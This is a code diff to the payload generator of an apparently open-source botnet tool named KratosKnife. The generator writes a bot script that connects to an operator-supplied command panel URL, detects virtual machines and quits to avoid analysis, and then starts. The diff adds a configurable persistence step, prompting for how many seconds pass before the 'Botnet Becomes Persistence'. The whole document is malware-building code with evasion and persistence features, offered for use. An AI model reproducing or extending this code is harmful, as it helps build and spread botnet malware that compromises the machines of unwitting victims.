@@ -72,13 +72,14 @@ def run_interactive_mode():
     
     return panelURL, file_name, icon_path
 
-def generate_payload(file_name, panelURL):
+def generate_payload(file_name, panelURL, time_persistent):
     with open(file_name, "w+") as file:
         file.write("import time, sys\n")
         file.write("import KratosKnife as K\n\n")
         file.write(f"def {file_name}_function():\n")
         file.write("\ttry:\n")
         file.write(f"\t\t{file_name} = K.Payload(\"{panelURL}\")\n") 
+        file.write(f"\t\t{file_name}.become_persistent({time_persistent})\n")
         file.write(f"\t\t{file_name}.detect_vm_and_quit()\n") 
         file.write(f"\t\t{file_name}.connect()\n") 
         file.write(f"\t\t{file_name}.start()\n") 
@@ -193,6 +194,11 @@ if __name__ == "__main__":
                 file_name = input(f"{WHITE}[?] Enter Output File Name: {GREEN}")                
             else: 
                 file_name = arguments.output
+                
+            if not arguments.time_persistent:
+                time_persistent = int(input(f"{WHITE}[?] Botnet Becomes Persistence After __ seconds [DEFAULT : 10]: {GREEN}"))           
+            else: 
+                time_persistent = arguments.time_persistent               
         
             if not arguments.icon:
                 icon_path = "" 
@@ -209,7 +215,7 @@ if __name__ == "__main__":
         debugging = debugging.lower()
         
         print(f"{YELLOW}\n[*] Generating Payload Source Codes ...")
-        generate_payload(file_name, panelURL)  # Generating Payload Source File
+        generate_payload(file_name, panelURL, time_persistent)  # Generating Payload Source File
         print(f"{GREEN}[+] Payload Source Codes Generated Successfully!")
 
         key = input(f"{WHITE}\n[?] Enter Weak Numeric Key [Recommended Password Length : 5] : ")
